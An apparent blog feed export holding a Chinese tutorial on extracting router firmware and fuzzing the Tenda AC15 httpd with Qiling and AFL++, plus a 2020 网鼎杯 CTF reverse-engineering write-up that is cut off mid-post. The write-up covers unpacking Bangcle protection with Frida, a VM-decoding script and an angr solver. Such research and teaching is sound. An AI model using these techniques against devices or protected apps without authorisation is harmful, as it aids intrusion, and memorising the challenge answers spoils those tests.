    <content type="html"><![CDATA[<h1 id="IoT固件提取并使用qiling进行fuzz"><a href="#IoT固件提取并使用qiling进行fuzz" class="headerlink" title="IoT固件提取并使用qiling进行fuzz"></a>IoT固件提取并使用qiling进行fuzz</h1><h2 id="固件提取"><a href="#固件提取" class="headerlink" title="固件提取"></a>固件提取</h2><p>这里说的固件提取主要讨论的是如何从得到的固件包中提取完整的squashfs-root目录，即IoT精简的Linux，本片以路由器固件作为示例。</p><p>固件包的格式一般有bin，chk等，获取方法一般有硬件跳线，升级固件过程中的数据包捕获，官网提供的升级包等。</p><p>获取到固件后一般会使用<code>binwalk -e</code>进行提取，但只安装binwalk会提示</p><p><a href="https://i.loli.net/2020/07/18/FWYSvhPCz3skNob.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2020/07/18/FWYSvhPCz3skNob.png" class="lazyload"></a></p><p>也就是说，squashfs镜像能够成功提取，但无法解压，这里有两种解决方法：</p><ol><li>安装<strong>squashfs-tools</strong>和<strong>sasquatch</strong></li></ol><p>对于squashfs-tools只需要</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install squashfs-tools</span><br></pre></td></tr></table></figure></div><p>sasquatch需要自己编译</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install build-essential liblzma-dev liblzo2-dev zlib1g-dev</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/devttys0/sasquatch</span><br><span class="line"><span class="built_in">cd</span> sasquatch</span><br><span class="line">./build.sh</span><br></pre></td></tr></table></figure></div><p><a href="https://i.loli.net/2020/07/18/GnItcSKzBH29XLE.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2020/07/18/GnItcSKzBH29XLE.png" class="lazyload"></a></p><p>进入解压后到文件夹找到squashfs-root文件夹即可</p><p><a href="https://i.loli.net/2020/07/18/Y49BadpfzjDNVr5.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2020/07/18/Y49BadpfzjDNVr5.png" class="lazyload"></a></p><ol start="2"><li>安装<strong>firmware-mod-kit</strong></li></ol><p>firmware-mod-kit也需要自己编译，经测试发现最佳环境是Ubuntu 16或18</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/rampageX/firmware-mod-kit.git</span><br><span class="line"><span class="built_in">cd</span> firmware-mod-kit/src</span><br><span class="line">make</span><br></pre></td></tr></table></figure></div><p>编译完成后使用根目录下脚本unsquashfs_all.sh解压squashfs镜像即可</p><p><a href="https://i.loli.net/2020/07/18/kKx1rqtRuIC4l6Q.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2020/07/18/kKx1rqtRuIC4l6Q.png" class="lazyload"></a></p><h2 id="IoT-Fuzz"><a href="#IoT-Fuzz" class="headerlink" title="IoT Fuzz"></a>IoT Fuzz</h2><p>以往想要对固件进行fuzz比较困难，需要在Qemu上模拟运行，并根据不同的固件还得自定义大量设置。</p><p>作为Qiling的代码主要贡献者，在这里介绍一下Qiling：<a href="https://github.com/qilingframework/qiling" target="_blank" rel="noopener">https://github.com/qilingframework/qiling</a></p><p>Qiling基于Unicorn和Qemu用户模式，是一个OS级的模拟仿真框架，能够模拟Windows, MacOS, Linux, BSD, UEFI等系统环境，并支持X86, X86_64, Arm, Arm64, MIPS等多个架构。</p><p>常见IoT固件，尤其是路由器固件都是ARM或MIPS架构，因此Qiling能够很好的对其进行模拟执行。</p><p>安装Qiling很简单，只需要：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/qilingframework/qiling</span><br><span class="line"><span class="built_in">cd</span> qiling</span><br><span class="line">sudo python3 setup.py install</span><br></pre></td></tr></table></figure></div><p>下面演示使用Qiling模拟tenda ac15路由器的httpd组件</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os, socket, sys, threading</span><br><span class="line">sys.path.append(<span class="string">".."</span>)</span><br><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">patcher</span><span class="params">(ql)</span>:</span></span><br><span class="line">    br0_addr = ql.mem.search(<span class="string">"br0"</span>.encode() + <span class="string">b'\x00'</span>)</span><br><span class="line">    <span class="keyword">for</span> addr <span class="keyword">in</span> br0_addr:</span><br><span class="line">        ql.mem.write(addr, <span class="string">b'lo\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nvram_listener</span><span class="params">()</span>:</span></span><br><span class="line">    server_address = <span class="string">'rootfs/var/cfm_socket'</span></span><br><span class="line">    data = <span class="string">""</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        os.unlink(server_address)  </span><br><span class="line">    <span class="keyword">except</span> OSError:  </span><br><span class="line">        <span class="keyword">if</span> os.path.exists(server_address):  </span><br><span class="line">            <span class="keyword">raise</span>  </span><br><span class="line"></span><br><span class="line">    <span class="comment"># Create UDS socket  </span></span><br><span class="line">    sock = socket.socket(socket.AF_UNIX,socket.SOCK_STREAM)  </span><br><span class="line">    sock.bind(server_address)  </span><br><span class="line">    sock.listen(<span class="number">1</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">        connection, client_address = sock.accept()  </span><br><span class="line">        <span class="keyword">try</span>:  </span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">                data += str(connection.recv(<span class="number">1024</span>))</span><br><span class="line">        </span><br><span class="line">                <span class="keyword">if</span> <span class="string">"lan.webiplansslen"</span> <span class="keyword">in</span> data:  </span><br><span class="line">                    connection.send(<span class="string">'192.168.170.169'</span>.encode())  </span><br><span class="line">                <span class="keyword">elif</span> <span class="string">"wan_ifname"</span> <span class="keyword">in</span> data:</span><br><span class="line">                    connection.send(<span class="string">'eth0'</span>.encode())</span><br><span class="line">                <span class="keyword">elif</span> <span class="string">"wan_ifnames"</span> <span class="keyword">in</span> data:</span><br><span class="line">                    connection.send(<span class="string">'eth0'</span>.encode())</span><br><span class="line">                <span class="keyword">elif</span> <span class="string">"wan0_ifname"</span> <span class="keyword">in</span> data:</span><br><span class="line">                    connection.send(<span class="string">'eth0'</span>.encode())</span><br><span class="line">                <span class="keyword">elif</span> <span class="string">"wan0_ifnames"</span> <span class="keyword">in</span> data:</span><br><span class="line">                    connection.send(<span class="string">'eth0'</span>.encode())</span><br><span class="line">                <span class="keyword">elif</span> <span class="string">"sys.workmode"</span> <span class="keyword">in</span> data:</span><br><span class="line">                    connection.send(<span class="string">'bridge'</span>.encode())</span><br><span class="line">                <span class="keyword">elif</span> <span class="string">"wan1.ip"</span> <span class="keyword">in</span> data:</span><br><span class="line">                    connection.send(<span class="string">'1.1.1.1'</span>.encode())</span><br><span class="line">                <span class="keyword">else</span>: </span><br><span class="line">                    <span class="keyword">break</span>  </span><br><span class="line">                data = <span class="string">""</span></span><br><span class="line">        <span class="keyword">finally</span>:  </span><br><span class="line">                connection.close() </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_sandbox</span><span class="params">(path, rootfs)</span>:</span></span><br><span class="line">    ql = Qiling(path, rootfs, output = <span class="string">"debug"</span>)</span><br><span class="line">    ql.add_fs_mapper(<span class="string">"/dev/urandom"</span>,<span class="string">"/dev/urandom"</span>)</span><br><span class="line">    ql.hook_address(patcher ,ql.loader.elf_entry)</span><br><span class="line">    ql.run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    nvram_listener_therad =  threading.Thread(target=nvram_listener, daemon=<span class="literal">True</span>)</span><br><span class="line">    nvram_listener_therad.start()</span><br><span class="line">    my_sandbox([<span class="string">"rootfs/bin/httpd"</span>], <span class="string">"rootfs"</span>)</span><br></pre></td></tr></table></figure></div><p><a href="https://i.loli.net/2020/07/18/KG8UQHESaV2YyWp.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2020/07/18/KG8UQHESaV2YyWp.png" class="lazyload"></a></p><p>对固件进行fuzz需要结合AFL++ Unicorn模式使用</p><p>AFL++ Unicorn安装方式</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/AFLplusplus/AFLplusplus.git</span><br><span class="line"><span class="built_in">cd</span> AFLplusplus</span><br><span class="line">make binary-only</span><br><span class="line"><span class="built_in">cd</span> unicorn_mode</span><br><span class="line">./build_unicorn_support.sh</span><br><span class="line"><span class="built_in">cd</span> unicornafl/bindings/python</span><br><span class="line">python3 setup.py install</span><br></pre></td></tr></table></figure></div><p>安装完成后运行python3,执行import unicornafl没有报错则安装成功</p><p>Fuzz的示例脚本可以看这里： <a href="https://github.com/qilingframework/qiling/blob/master/examples/fuzzing" target="_blank" rel="noopener">https://github.com/qilingframework/qiling/blob/master/examples/fuzzing</a></p><p>Fuzz结果如下：</p><p><a href="https://i.loli.net/2020/07/18/VXBFCYS4NejlKhn.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2020/07/18/VXBFCYS4NejlKhn.png" class="lazyload"></a></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;IoT固件提取并使用qiling进行fuzz&quot;&gt;&lt;a href=&quot;#IoT固件提取并使用qiling进行fuzz&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="IoT" scheme="https://kabeor.github.io/categories/IoT/"/>
    
    
    <category term="IoT" scheme="https://kabeor.github.io/tags/IoT/"/>
    
    <category term="Fuzz" scheme="https://kabeor.github.io/tags/Fuzz/"/>
    
  </entry>
  
  <entry>
    <title>2020网鼎杯RE WP</title>
    <link href="https://kabeor.github.io/2020%E7%BD%91%E9%BC%8E%E6%9D%AFRE_WP/"/>
    <id>https://kabeor.github.io/2020%E7%BD%91%E9%BC%8E%E6%9D%AFRE_WP/</id>
    <published>2020-05-09T16:00:00.000Z</published>
    <updated>2020-05-19T12:37:08.718Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2020网鼎杯RE-WP"><a href="#2020网鼎杯RE-WP" class="headerlink" title="2020网鼎杯RE WP"></a>2020网鼎杯RE WP</h1><h2 id="re-bang"><a href="#re-bang" class="headerlink" title="re_bang"></a>re_bang</h2><p>jeb拖进去一看，梆梆加固免费版，掏出Frida直接dump，具体可看之前写的这篇 <a href="https://kabeor.cn/使用Frida给apk脱壳并穿透加固Hook函数/" target="_blank" rel="noopener">使用Frida给apk脱壳并穿透加固Hook函数</a>  。</p><p>dump出三个dex，看下大小基本确定了解密后的dex</p><p>由于分析dex不太舒服，就直接转jar拿jd-gui看了，没想到flag直接硬编码。</p><p><a href="https://i.loli.net/2020/05/12/bAf1gJTcMhjqWvZ.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2020/05/12/bAf1gJTcMhjqWvZ.png" class="lazyload"></a></p><h2 id="signal"><a href="#signal" class="headerlink" title="signal"></a>signal</h2><p>简易VM，没什么可说的，进去就能看到逻辑</p><p><a href="https://i.loli.net/2020/05/12/WUrz2JviGPkQwOo.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2020/05/12/WUrz2JviGPkQwOo.png" class="lazyload"></a></p><p>先把opcode提取出来，456个字节，把0去了，还剩114字节（456/4）</p><p><a href="https://i.loli.net/2020/05/12/O5XlJWh4mGvrZkL.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2020/05/12/O5XlJWh4mGvrZkL.png" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10,4,16,8,3,5,1,4,32,8,5,3,1,3,2,8,11,1,12,8,4,4,1,5,3,8,3,33,1,11,8,11,1,4,9,8,3,32,1,2,81,8,4,36,1,12,8,11,1,5,2,8,2,37,1,2,54,8,4,65,1,2,32,8,5,1,1,5,3,8,2,37,1,4,9,8,3,32,1,2,65,8,12,1,7,34,7,63,7,52,7,50,7,114,7,51,7,24,7,167,255,255,255,7,49,7,241,255,255,255,7,40,7,132,255,255,255,7,193,255,255,255,7,30,7,122</span><br></pre></td></tr></table></figure></div><p>然后看vm操作，就12个case</p><p><a href="https://i.loli.net/2020/05/12/KDl5Fg9Sthm8viW.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2020/05/12/KDl5Fg9Sthm8viW.png" class="lazyload"></a></p><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><p>直接写脚本提取一下看看(骚操作之print指令)</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">code=[</span><br><span class="line">   <span class="number">10</span>,<span class="number">4</span>,<span class="number">16</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">32</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">8</span>,</span><br><span class="line">   <span class="number">11</span>,<span class="number">1</span>,<span class="number">12</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">33</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">8</span>,</span><br><span class="line">   <span class="number">11</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">32</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">81</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">36</span>,<span class="number">1</span>,<span class="number">12</span>,</span><br><span class="line">   <span class="number">8</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">37</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">54</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">65</span>,<span class="number">1</span>,<span class="number">2</span>,</span><br><span class="line">   <span class="number">32</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">37</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">32</span>,<span class="number">1</span>,</span><br><span class="line">   <span class="number">2</span>,<span class="number">65</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">34</span>,<span class="number">7</span>,<span class="number">63</span>,<span class="number">7</span>,<span class="number">52</span>,<span class="number">7</span>,<span class="number">50</span>,<span class="number">7</span>,<span class="number">114</span>,</span><br><span class="line">   <span class="number">7</span>,<span class="number">51</span>,<span class="number">7</span>,<span class="number">24</span>,<span class="number">7</span>,<span class="number">167</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">7</span>,<span class="number">49</span>,<span class="number">7</span>,<span class="number">241</span>,</span><br><span class="line">   <span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">7</span>,<span class="number">40</span>,<span class="number">7</span>,<span class="number">132</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">7</span>,</span><br><span class="line">   <span class="number">193</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">7</span>,<span class="number">30</span>,<span class="number">7</span>,<span class="number">122</span>]</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">v9 = <span class="number">0</span></span><br><span class="line">v8 = <span class="number">0</span></span><br><span class="line">v7 = <span class="number">0</span></span><br><span class="line">v6 = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> ):</span><br><span class="line">  result = i</span><br><span class="line">  <span class="comment">#print(code[i])</span></span><br><span class="line">  <span class="keyword">if</span> i &gt;= <span class="number">114</span> :</span><br><span class="line">    print(result)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">  <span class="keyword">elif</span> code[i] == <span class="number">1</span>:</span><br><span class="line">    print(<span class="string">"v4[v7] = v5"</span>)</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    print(<span class="string">"v7+=1"</span>)</span><br><span class="line">    print(<span class="string">"v9+=1"</span>)</span><br><span class="line">  <span class="keyword">elif</span> code[i] == <span class="number">2</span>:</span><br><span class="line">    print(<span class="string">"v5 = code[i + 1] + Str[v9]"</span>)</span><br><span class="line">    i += <span class="number">2</span></span><br><span class="line">  <span class="keyword">elif</span> code[i] == <span class="number">3</span>:</span><br><span class="line">    print(<span class="string">"v5 = Str[v9] - LOBYTE(code[i + 1])"</span>)</span><br><span class="line">    i += <span class="number">2</span></span><br><span class="line">  <span class="keyword">elif</span> code[i] == <span class="number">4</span>:</span><br><span class="line">    print(<span class="string">"v5 = code[i + 1] ^ Str[v9]"</span>)</span><br><span class="line">    i += <span class="number">2</span></span><br><span class="line">  <span class="keyword">elif</span> code[i] == <span class="number">5</span>:</span><br><span class="line">    print(<span class="string">"v5 = code[i + 1] * Str[v9]"</span>)</span><br><span class="line">    i += <span class="number">2</span></span><br><span class="line">  <span class="keyword">elif</span> code[i] == <span class="number">6</span>:</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">  <span class="keyword">elif</span> code[i] == <span class="number">7</span>:</span><br><span class="line">    print(<span class="string">"if ( v4[v8] != code[i + 1] )&#123; printf(\"what a shame...\");exit(0);&#125;v8+=1"</span>)</span><br><span class="line">    i += <span class="number">2</span></span><br><span class="line">  <span class="keyword">elif</span> code[i] == <span class="number">8</span>:</span><br><span class="line">    print(<span class="string">"Str[v6] = v5"</span>)</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    print(<span class="string">"v6+=1"</span>)</span><br><span class="line">  <span class="keyword">elif</span> code[i] == <span class="number">10</span>:</span><br><span class="line">    print(<span class="string">"read(Str)"</span>)</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">  <span class="keyword">elif</span> code[i] == <span class="number">11</span>:</span><br><span class="line">    print(<span class="string">"v5 = Str[v9] - 1"</span>)</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">  <span class="keyword">elif</span> code[i] == <span class="number">12</span>:</span><br><span class="line">    print(<span class="string">"v5 = Str[v9] + 1"</span>)</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">continue</span></span><br></pre></td></tr></table></figure></div><p>得到</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">read(Str)</span><br><span class="line"></span><br><span class="line">v5 = code[i + <span class="number">1</span>] ^ Str[v9]</span><br><span class="line">Str[v6] = v5</span><br><span class="line">v6+=<span class="number">1</span></span><br><span class="line">v5 = Str[v9] - LOBYTE(code[i + <span class="number">1</span>])</span><br><span class="line">v4[v7] = v5</span><br><span class="line">v7+=<span class="number">1</span></span><br><span class="line">v9+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">v5 = code[i + <span class="number">1</span>] ^ Str[v9]</span><br><span class="line">Str[v6] = v5</span><br><span class="line">v6+=<span class="number">1</span></span><br><span class="line">v5 = code[i + <span class="number">1</span>] * Str[v9]</span><br><span class="line">v4[v7] = v5</span><br><span class="line">v7+=<span class="number">1</span></span><br><span class="line">v9+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">v5 = Str[v9] - LOBYTE(code[i + <span class="number">1</span>])</span><br><span class="line">Str[v6] = v5</span><br><span class="line">v6+=<span class="number">1</span></span><br><span class="line">v5 = Str[v9] - <span class="number">1</span></span><br><span class="line">v4[v7] = v5</span><br><span class="line">v7+=<span class="number">1</span></span><br><span class="line">v9+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">v5 = Str[v9] + <span class="number">1</span></span><br><span class="line">Str[v6] = v5</span><br><span class="line">v6+=<span class="number">1</span></span><br><span class="line">v5 = code[i + <span class="number">1</span>] ^ Str[v9]</span><br><span class="line">v4[v7] = v5</span><br><span class="line">v7+=<span class="number">1</span></span><br><span class="line">v9+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">v5 = code[i + <span class="number">1</span>] * Str[v9]</span><br><span class="line">Str[v6] = v5</span><br><span class="line">v6+=<span class="number">1</span></span><br><span class="line">v5 = Str[v9] - LOBYTE(code[i + <span class="number">1</span>])</span><br><span class="line">v4[v7] = v5</span><br><span class="line">v7+=<span class="number">1</span></span><br><span class="line">v9+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">v5 = Str[v9] - <span class="number">1</span></span><br><span class="line">Str[v6] = v5</span><br><span class="line">v6+=<span class="number">1</span></span><br><span class="line">v5 = Str[v9] - <span class="number">1</span></span><br><span class="line">v4[v7] = v5</span><br><span class="line">v7+=<span class="number">1</span></span><br><span class="line">v9+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">v5 = code[i + <span class="number">1</span>] ^ Str[v9]</span><br><span class="line">Str[v6] = v5</span><br><span class="line">v6+=<span class="number">1</span></span><br><span class="line">v5 = Str[v9] - LOBYTE(code[i + <span class="number">1</span>])</span><br><span class="line">v4[v7] = v5</span><br><span class="line">v7+=<span class="number">1</span></span><br><span class="line">v9+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">v5 = code[i + <span class="number">1</span>] + Str[v9]</span><br><span class="line">Str[v6] = v5</span><br><span class="line">v6+=<span class="number">1</span></span><br><span class="line">v5 = code[i + <span class="number">1</span>] ^ Str[v9]</span><br><span class="line">v4[v7] = v5</span><br><span class="line">v7+=<span class="number">1</span></span><br><span class="line">v9+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">v5 = Str[v9] + <span class="number">1</span></span><br><span class="line">Str[v6] = v5</span><br><span class="line">v6+=<span class="number">1</span></span><br><span class="line">v5 = Str[v9] - <span class="number">1</span></span><br><span class="line">v4[v7] = v5</span><br><span class="line">v7+=<span class="number">1</span></span><br><span class="line">v9+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">v5 = code[i + <span class="number">1</span>] * Str[v9]</span><br><span class="line">Str[v6] = v5</span><br><span class="line">v6+=<span class="number">1</span></span><br><span class="line">v5 = code[i + <span class="number">1</span>] + Str[v9]</span><br><span class="line">v4[v7] = v5</span><br><span class="line">v7+=<span class="number">1</span></span><br><span class="line">v9+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">v5 = code[i + <span class="number">1</span>] + Str[v9]</span><br><span class="line">Str[v6] = v5</span><br><span class="line">v6+=<span class="number">1</span></span><br><span class="line">v5 = code[i + <span class="number">1</span>] ^ Str[v9]</span><br><span class="line">v4[v7] = v5</span><br><span class="line">v7+=<span class="number">1</span></span><br><span class="line">v9+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">v5 = code[i + <span class="number">1</span>] + Str[v9]</span><br><span class="line">Str[v6] = v5</span><br><span class="line">v6+=<span class="number">1</span></span><br><span class="line">v5 = code[i + <span class="number">1</span>] * Str[v9]</span><br><span class="line">v4[v7] = v5</span><br><span class="line">v7+=<span class="number">1</span></span><br><span class="line">v9+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">v5 = code[i + <span class="number">1</span>] * Str[v9]</span><br><span class="line">Str[v6] = v5</span><br><span class="line">v6+=<span class="number">1</span></span><br><span class="line">v5 = code[i + <span class="number">1</span>] + Str[v9]</span><br><span class="line">v4[v7] = v5</span><br><span class="line">v7+=<span class="number">1</span></span><br><span class="line">v9+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">v5 = code[i + <span class="number">1</span>] ^ Str[v9]</span><br><span class="line">Str[v6] = v5</span><br><span class="line">v6+=<span class="number">1</span></span><br><span class="line">v5 = Str[v9] - LOBYTE(code[i + <span class="number">1</span>])</span><br><span class="line">v4[v7] = v5</span><br><span class="line">v7+=<span class="number">1</span></span><br><span class="line">v9+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">v5 = code[i + <span class="number">1</span>] + Str[v9]</span><br><span class="line">Str[v6] = v5</span><br><span class="line">v6+=<span class="number">1</span></span><br><span class="line">v5 = Str[v9] + <span class="number">1</span></span><br><span class="line">v4[v7] = v5</span><br><span class="line">v7+=<span class="number">1</span></span><br><span class="line">v9+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( v4[v8] != code[i + <span class="number">1</span>] )</span><br><span class="line">&#123; </span><br><span class="line">    printf(<span class="string">"what a shame..."</span>);exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">v8+=<span class="number">1</span></span><br></pre></td></tr></table></figure></div><p>还是挺有规律的，一组就是一个handle，借个看雪的分析吧，自己的太乱</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10h ^ input[1]-5 &#x3D; 22h</span><br><span class="line">(20h ^input[2])*3&#x3D;3Fh</span><br><span class="line">input[3]-2-1&#x3D;34h</span><br><span class="line">(input[4]+1 )^4 &#x3D;32 h</span><br><span class="line">input[5]*3-21h&#x3D;72h</span><br><span class="line">input[6]-1-1&#x3D;33h</span><br><span class="line">9^input[7]-20&#x3D;18</span><br><span class="line">(51h +input[8])^24h&#x3D;FA7</span><br><span class="line">input[9]+1-1&#x3D;31h</span><br><span class="line">2*input[10]+25h&#x3D;F1h</span><br><span class="line">(36h+input[11]) ^41h &#x3D;28h</span><br><span class="line">(20h + input[12])*1&#x3D;F84h</span><br><span class="line">3*input[13]+25h&#x3D;C1h</span><br><span class="line">9^input[14]-20h&#x3D;1E h</span><br><span class="line">41h + input[15] +1 &#x3D;7A h</span><br></pre></td></tr></table></figure></div><p>这么头铁的解法当然是不够优雅的，且看下面符号执行</p><h3 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h3><p>angr直接跑</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">p = angr.Project(<span class="string">'signa.exe'</span>)</span><br><span class="line">st = p.factory.entry_state()</span><br><span class="line">sm = p.factory.simulation_manager(st)</span><br><span class="line">sm.explore(find=<span class="number">0x40179E</span>, avoid=<span class="number">0x4016E6</span>)</span><br><span class="line">print(sm.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure></div><p>几秒钟完事，十分枯燥</p><p><a href="https://i.loli.net/2020/05/12/bUq2l7kFZAEyO5Q.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2020/05/12/bUq2l7kFZAEyO5Q.png" class="lazyload"></a></p><h2 id="jocker"><a href="#jocker" class="headerlink" title="jocker"></a>jocker</h2><p>这道题怎么说，男默女泪，最后四个字节还得靠猜？？？</p><p>ida看一下，是简单的SMC</p><p><a href="https://i.loli.net/2020/05/12/zjG5a2wfYicEMI7.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2020/05/12/zjG5a2wfYicEMI7.png" class="lazyload"></a></p><p>直接od调到解密后dump出来，要解密的地址是401500</p><p>dump以后再用ida看看，一共解密出两个函数</p><p><a 